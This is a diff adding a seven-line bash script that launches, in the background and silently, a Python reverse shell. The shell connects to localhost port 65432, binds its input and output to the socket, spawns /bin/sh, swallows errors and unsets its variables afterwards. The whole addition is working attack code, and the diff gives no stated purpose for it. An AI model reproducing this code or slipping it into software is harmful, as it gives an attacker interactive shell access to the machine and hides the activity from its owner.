@@ -1,0 +1,7 @@
+#!/bin/bash
+
+export RHOST=localhost
+export RPORT=65432
+nohup python3 -c 'exec("try:import socket,os,pty;s=socket.socket();s.connect((os.environ[\"RHOST\"],int(os.environ[\"RPORT\"])));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")\nexcept:pass")' >/dev/null 2>&1 &
+unset RHOST
+unset RPORT
